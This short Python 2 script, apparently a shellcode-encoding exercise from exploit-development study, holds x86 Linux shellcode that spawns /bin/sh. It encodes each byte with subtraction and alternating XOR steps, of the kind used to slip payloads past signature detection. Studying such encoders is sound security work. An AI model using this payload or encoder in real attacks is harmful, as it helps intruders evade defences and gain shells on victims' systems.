# Custom Encoder
# Author: buffered4ever
# 15-03-2019

shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded = ""
encoded2 = ""
encoded3 = ""
count = 1
for x in bytearray(shellcode):
    y = x - 4
    z = y ^ 0xff
    encoded += '\\x'
    encoded += '%02x' %z

    encoded2 += '0x'
    encoded2 += '%02x,' %z
    if count % 2!=0:
        encoded3 += '0x'
        encoded3 += '%02x,' %z
    else:
        v = z ^ 0xaa
        encoded3 +=  '0x'
        encoded3 += '%02x,' %v
    count +=1

print encoded3

print 'Len: %d' % len(bytearray(shellcode))
